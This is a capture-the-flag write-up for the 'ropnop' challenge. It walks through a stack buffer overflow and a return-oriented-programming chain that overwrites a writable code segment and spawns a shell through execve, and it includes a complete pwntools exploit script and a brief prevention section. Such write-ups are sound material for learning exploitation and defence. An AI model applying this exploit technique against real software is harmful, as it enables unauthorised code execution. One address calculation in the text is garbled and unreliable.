# First thoughts:
The program starts with showing the line e.g. `[defusing returns] start: 0x55734580a000 - end: 0x55734580b375` and then a user input which does nothing. After looking at the provided source code I saw that like the name of the challenge implies a ROP attack is expected. For that reason a function `gadget_shop` is provided which creates very useful assembly snippets to make this happen. The problem is that the function `ropnop` gets called which first turn an interval of the memory readable, writable and executable and replaces each `ret` assembly to an `nop` assembly. Unluckily the `gadget_shop` function is inside this interval so the gadgets are almost useless. But luckily the memory interval isn't set to non writable back, so I can overwrite it too.
The input is read with the `read` function which has a buffer length of 0x1337 bytes provided. But if I look at the disassembly the buffer length is much smaller so a BufferOverflow is possible. 
With the program checksec I noticed that there are no stack canaries provided so I don't have to deal with them.
The goal will be to make a `syscall` with the rsi and rdx register set to 0, the rax set to 0x3b this ensures that the `syscall` command does `execve` so it executes a program to which the path is inside rdi. The path I want is `/bin/sh` so a shell gets executed.

# The Exploit:
First I created a small python script with pwntools. The script waits for the string `[defusing returns] start ` and saves the start and end address.
Then I needed to find out the offset of the buffer start and the return address which I want to overwrite. I did this with the `cyclic(0xff)` function. The `cylic` function creates a sequence of chars generated by pwntools. This sequence is special as every part can be recognized by only 4 chars. I attach gdb to the program and wait until an SegmentationFault. There gdb tells me to what address the program tried to jump, it turns out to be `gaaa`. So now I know if I replace `cyclic(0xff)` by `"A"*cyclic_find("gaaa")` then the next thing overwrites the return address. 
Now I could create a first payload but again because of the risk of an unaligned stack I need to get it aligned by a simple return gadget e.g. 0x55734580B374 (0x55734580a000-0x55734580B374 = -0x1374).
Like I said the plan is to overwrite the writable memory space with the help of the `read` function from main. The `read` function gets its buffer from the rsi register. With the help of the program ROPgadget and the command `ROPgadget  --all --binary ropnop` I can get all gadgets found, so duplicates are shown too. This is important because the ropnop program has gadgets which are overwritten on run time. I decided to use a gadget which does `pop rsi; pop r15; ret` because it is the only usable gadget which does `pop rsi`(e.g. 0x55734580a000-0x55734580B351 = -0x1351). I the had to think about where I wanted to write to. I decided thought that I needed to use the `printf` instruction later so I started my buffer on the instruction after it (e.g.  0x55734580a000-0x55734580B234 = -0x1234). I later saw that I didn't need this but it doesn't really matter where I put them. 
So the payload consists of the pop address and then the buffer address but because my pop address has 2 pops before it returns I also write a Padding of 8 bytes to the stack which gets poped to r15.
Now I need to call the `read` instruction by jumping to it (e.g. 0x55734580a000-0x93953575662282 = -12ca).
This second `read` instruction gets send this input: `p8(0xc3) + POP_RAX_RET_COMMAND + POP_RSI_RET_COMMAND + POP_RDX_RET_COMMAND + BINSH_COMMAND + p8(0x90)*0x9f + p8(0xc3)`.
It first sets a `ret`instruction after the `printf`, `pop rax; ret;`, `pop rsi; ret;`, `pop rdx; ret;`, `/bin/sh\x00` and finally a `nop` slide with a `ret` in the end. With this I have all the necessary ropgadgets at my disposal so I can write the rest of my first payload. I also calculated the address of the gadgets by adding the number of bytes before from the buffer start.
To make the final call, I call my `pop rax; ret;` command with 0x3b for `execve`, then `pop rdi; ret;` with the address of `/bin/sh\x00`. I haven't wrote t his command my self, I found it with ROPgadgets. Then I called `pop rsi; ret;` and  `pop rdx; ret;` with both 0 and finally called the `syscall` instruction also found with ROPgadgets.
The result looks like this:

```
from pwn import *

p = process("./ropnop")
#p = remote("hax1.allesctf.net", 9300)

p.recvuntil("[defusing returns] start: ")
START = int(p.recvuntil(" - end: ").replace(" - end: ", ""), 16)
STOP = int(p.recvline(), 16)

RET = START + 0x1374

NEW_RET = START + 0x1234

EDX_READ = START + 0x12ca

POP_RDI_RET = START + 0x1353
POP_RSI_POP_R15_RET = START + 0x1351
SYSCALL = START + 0x11e4

log.info("Leaked START value 0x{:x}".format(START))
log.info("Leaked STOP value 0x{:x}".format(STOP))
log.info("Leaked NEW_RET value 0x{:x}".format(NEW_RET))
log.info("Leaked RET value 0x{:x}".format(RET))
log.info("Leaked POP_RDI_RET value 0x{:x}".format(POP_RDI_RET))
log.info("Leaked POP_RSI_POP_R15_RET value 0x{:x}".format(POP_RSI_POP_R15_RET))
log.info("Leaked EDX_READ value 0x{:x}".format(EDX_READ))
log.info("Leaked SYSCALL value 0x{:x}".format(SYSCALL))

raw_input("attach gdb")

POP_RAX_RET = START + 0x1235
POP_RSI_RET = START + 0x1237
POP_RDX_RET = START + 0x1239
BINSH = START + 0x123b

PADDING = "A"*cyclic_find("gaaa")
PADDING2 = "B"*8
p.sendline(PADDING + p64(RET) + p64(RET) + p64(POP_RSI_POP_R15_RET) + p64(NEW_RET) + PADDING2 + p64(RET) + p64(EDX_READ) + p64(RET) + p64(POP_RAX_RET) + p64(0x3b) + p64(RET) + p64(RET) + p64(POP_RDI_RET) + p64(BINSH) + p64(RET) + p64(RET) + p64(POP_RSI_RET) + p64(0x0) + p64(RET) + p64(RET) + p64(POP_RDX_RET) + p64(0x0) + p64(RET) + p64(RET) + p64(SYSCALL))
POP_RAX_RET_COMMAND = p8(0x58) + p8(0xc3)
POP_RSI_RET_COMMAND = p8(0x5e) + p8(0xc3)
POP_RDX_RET_COMMAND = p8(0x5a) + p8(0xc3)
BINSH_COMMAND = "/bin/sh\x00"

log.info("Leaked POP_RAX_RET value 0x{:x}".format(POP_RAX_RET))
log.info("Leaked POP_RSI_RET value 0x{:x}".format(POP_RSI_RET))
log.info("Leaked POP_RDX_RET value 0x{:x}".format(POP_RDX_RET))

p.sendline(p8(0xc3) + POP_RAX_RET_COMMAND + POP_RSI_RET_COMMAND + POP_RDX_RET_COMMAND + BINSH_COMMAND + p8(0x90)*0x9f + p8(0xc3))

p.interactive()

```
Now that I got a bash just execute `cat flag` and the flag is printed out.
To get the real flag just change the attached program to the server and change the flag to the real one from ropnop and execute.

# Prevention:
The problem is that the user input is not sanitized.
If the input got sanitized and also it is a very dumb idea to make the the code segment writable and even if someone really wants to do this because he wants to decipher his own program then the segment should be set to non writable afterwards.
